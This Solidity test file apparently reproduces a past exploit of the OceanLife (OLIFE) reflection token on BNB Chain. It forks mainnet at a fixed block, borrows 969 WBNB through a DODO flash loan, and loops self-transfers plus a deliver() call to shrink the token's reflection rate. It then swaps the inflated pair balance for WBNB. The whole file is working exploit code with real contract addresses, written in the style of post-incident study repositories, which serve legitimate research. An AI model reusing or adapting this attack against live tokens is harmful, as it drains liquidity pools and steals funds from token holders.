// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./BaseTest.sol";

/*
 Tx hash: https://bscscan.com/tx/0xa21692ffb561767a74a4cbd1b78ad48151d710efab723b1efa5f1e0147caab0a
 Summary: 
    The attacker called the `transfer()` and `deliver()` functions to reduce the number of rSupply and tSupply.
    The value of rate is thus calculated less, increasing the number of reflected tokens in the pair, 
    Finally directly call swap to withdraw $WBNB from the pair.
*/

interface IOceanLife is IERC20 {
    function deliver(uint256 tAmount) external;
}

contract ExploitTest is BaseTest {
    IUniswapV2Router immutable router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 immutable WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IOceanLife immutable OLIFE = IOceanLife(0xb5a0Ce3Acd6eC557d39aFDcbC93B07a1e1a9e3fa);
    IUniswapV2Pair immutable OLIFE_WBNB = IUniswapV2Pair(0x915C2DFc34e773DC3415Fe7045bB1540F8BDAE84);
    IDPPOracle immutable dodo = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    
    uint256 immutable R_OWNED_SLOT = 1;
    uint256 immutable T_OWNED_SLOT = 2;
    uint256 immutable T_TOTAL_SLOT = 8;
    uint256 immutable R_TOTAL_SLOT = 9;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork("bsc", 26470678);
    }

    function testExploit() public {
        emit log_named_uint(
            "[INFO] OLIFE rTotal amount before exploit", getSlotUint(address(OLIFE), R_TOTAL_SLOT)
        );
        emit log_named_uint(
            "[INFO] LP Pool rOwned amount before exploit", getSlotUintbyAddress(address(OLIFE), R_OWNED_SLOT, address(OLIFE_WBNB))
        );

        uint256 FLASHLOAN_WBNB_AMOUNT = 969 ether;
        dodo.flashLoan(FLASHLOAN_WBNB_AMOUNT, 0, address(this), abi.encode(FLASHLOAN_WBNB_AMOUNT));

        emit log_named_decimal_uint(
            "[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        uint256 FLASHLOAN_WBNB_AMOUNT = abi.decode(data, (uint256));

        WBNB.approve(address(router), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(OLIFE);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            FLASHLOAN_WBNB_AMOUNT,
            0,
            path,
            address(this),
            block.timestamp
        );

        /*
            Reflection calculations
            Rate = rSupply / tSupply (Excluded users are not counted in the supply)
            balanceOf(pair) = rOwned[pair] / currentRate  
        */
        emit log_named_decimal_uint(
            "[INFO] OLIFE amount in pair before the currentRate reduction", OLIFE.balanceOf(address(OLIFE_WBNB)), 9
        );
        emit log_named_decimal_uint(
            "[INFO] OLIFE amount in attack contract before deliver", OLIFE.balanceOf(address(this)), 9
        );
        emit log_named_uint(
            "[INFO] OLIFE rTotal amount before loop transfer", getSlotUint(address(OLIFE), R_TOTAL_SLOT)
        );

        // Loop transfer to reduce currentRate
        for (uint256 i = 0; i < 19; i++) {
            uint256 amount = OLIFE.balanceOf(address(this));
            OLIFE.transfer(address(this), amount);
        }

        emit log_named_uint(
            "[INFO] OLIFE rTotal amount before deliver", getSlotUint(address(OLIFE), R_TOTAL_SLOT)
        );
        
        // Decrease rTotal
        OLIFE.deliver(66859267695870000);

        emit log_named_uint(
            "[INFO] OLIFE rTotal amount after deliver", getSlotUint(address(OLIFE), R_TOTAL_SLOT)
        );
        emit log_named_uint(
            "[INFO] LP Pool rOwned amount after deliver", getSlotUintbyAddress(address(OLIFE), R_OWNED_SLOT, address(OLIFE_WBNB))
        );

        emit log_named_decimal_uint(
            "[INFO] OLIFE amount in pair after the currentRate reduction", OLIFE.balanceOf(address(OLIFE_WBNB)), 9
        );
        emit log_named_decimal_uint(
            "[INFO] OLIFE amount in attack contract after deliver", OLIFE.balanceOf(address(this)), 9
        );
        
        (uint256 oldOlifeReserve, uint256 bnbReserve, ) = OLIFE_WBNB.getReserves();
        uint256 newolifeReserve = OLIFE.balanceOf(address(OLIFE_WBNB));
        uint256 amountin = newolifeReserve - oldOlifeReserve;
        uint256 swapAmount = amountin * 9975 * bnbReserve / (oldOlifeReserve * 10000 + amountin * 9975);
        
        // Swap OLIFE to WBNB
        OLIFE_WBNB.swap(0, swapAmount, address(this), "");

        // Repay flashloan
        WBNB.transfer(address(dodo), FLASHLOAN_WBNB_AMOUNT);
    }
}